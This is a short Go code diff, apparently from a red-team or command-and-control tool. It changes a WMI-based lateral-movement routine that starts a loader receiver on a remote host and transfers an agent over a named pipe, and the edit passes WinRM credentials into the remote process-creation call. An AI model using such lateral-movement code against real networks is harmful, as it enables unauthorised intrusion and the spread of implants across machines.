@@ -130,7 +130,7 @@ func wmiLoaderMove(payload lateralPayload, targetSession string, agent []byte, d
 	pipeName := wmiLoaderPipeName(targetSession)
 	script := wmiLoaderScript(pipeName, targetSession, payload.WorkspaceID, transfer)
 	command := buildWindowsCmdLine(append([]string{winrmReceiverCommandPath}, wmiLoaderArguments(script)...))
-	if err := wmiCreateProcess(payload.Host, command); err != nil {
+	if err := wmiCreateProcess(payload.Host, command, payload.winrmIdentity); err != nil {
 		return fmt.Errorf("start loader receiver on %s: %w", payload.Host, err)
 	}
 	conn, err := dialWmiLoaderPipe(payload.Host, pipeName, deadline)
